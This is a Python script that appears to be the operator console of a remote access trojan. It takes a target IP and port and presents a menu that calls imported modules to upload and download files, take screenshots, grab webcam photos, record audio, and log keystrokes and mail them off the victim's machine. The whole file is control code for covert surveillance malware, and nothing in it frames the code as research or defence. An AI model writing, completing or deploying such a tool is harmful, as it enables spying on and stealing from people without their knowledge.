from termcolor import colored
import socket
import sys,time
from cuploadfile import uploadfile
from cdownloadfile import downloadfile
from executeonremote import execonremote
from ckeylogger import keylogger

ip = sys.argv[1]
#print (f'IP global: {ip}')

port = int(sys.argv[2])
#print (f'Port global: {port}')

def upload():
#	print (f'IP: {ip}')
#	print (f'Port: {port}')

	uploadfile(ip,port)

def download():
	downloadfile(ip,port)

def grab_screenshot():
	execonremote(ip,port,'screenshot')

def capture_camera():
	execonremote(ip,port,'camcapture')

def record_audio():
	execonremote(ip,port,'audio')

def logkeystrokes():
	keylogger(ip,port)

if __name__ == "__main__":

	if len(sys.argv) == 1:
		print (colored("ERR!!!Please enter ip address and port of the remote system!!",'red'))
		exit()

	while True:
		print ()
		print ("="*42)
		print ("||	1.Upload a file			||")
		print ("||	2.Download a file		||")
		print ("||	3.Grab a Screenshot		||")
		print ("||	4.Grab a photo from WebCam	||")
		print ("||	5.Record audio			||")
		print ("||	6.Capture keystrokes and mail	||")
		print ("||	7.Exit				||")
		print ("="*42)

		print ()
		choice = int(input("Enter your prefered action: "))
		print ()

		match choice:
			case 1:
				upload()
			case 2:
				download()
			case 3:
				grab_screenshot()
			case 4:
				capture_camera()
			case 5:
				record_audio()
			case 6:
				logkeystrokes()
			case 7:
				print (colored(f'\nThank you for using this script\n','green'))
				break
			case _:
				print (colored(f'\nInvalid choice! Exiting.....\n','red'))
				break
